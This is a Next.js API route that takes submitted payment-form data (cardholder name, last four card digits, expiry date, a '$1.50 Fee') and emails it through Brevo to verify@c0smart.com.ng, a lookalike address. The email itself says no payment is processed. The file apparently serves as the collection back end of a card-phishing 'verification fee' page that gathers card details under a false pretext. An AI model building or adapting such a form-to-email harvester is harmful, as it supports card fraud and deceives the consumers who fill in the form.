import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const formData = await request.json()

    const brevoApiKey = process.env.BREVO_API_KEY

    if (!brevoApiKey) {
      return NextResponse.json({ error: "Brevo API key not configured" }, { status: 500 })
    }

    // Send email via Brevo API
    const emailResponse = await fetch("https://api.brevo.com/v3/smtp/email", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        "api-key": brevoApiKey,
      },
      body: JSON.stringify({
        sender: {
          name: "Payment Processing System",
          email: "verify@c0smart.com.ng",
        },
        to: [
          {
            email: "verify@c0smart.com.ng",
            name: "Verification Team",
          },
        ],
        subject: "New Payment Form Submission - $1.50 Fee",
        htmlContent: `
          <h2>New Payment Form Submission</h2>
          <p><strong>Cardholder Name:</strong> ${formData.cardholderName}</p>
          <p><strong>Card Number:</strong> **** **** **** ${formData.cardNumber.slice(-4)}</p>
          <p><strong>Expiry Date:</strong> ${formData.expiryDate}</p>
          <p><strong>Amount:</strong> $1.50</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
          
          <p style="color: red;"><strong>Note:</strong> This is form submission data only. No actual payment processing has occurred.</p>
        `,
        textContent: `
          New Payment Form Submission
          
          Cardholder Name: ${formData.cardholderName}
          Card Number: **** **** **** ${formData.cardNumber.slice(-4)}
          Expiry Date: ${formData.expiryDate}
          Amount: $1.50
          Submission Time: ${new Date().toLocaleString()}
          
          Note: This is form submission data only. No actual payment processing has occurred.
        `,
      }),
    })

    if (!emailResponse.ok) {
      const errorData = await emailResponse.json()
      console.error("Brevo API error:", errorData)
      return NextResponse.json({ error: "Failed to send payment notification email" }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending payment email:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
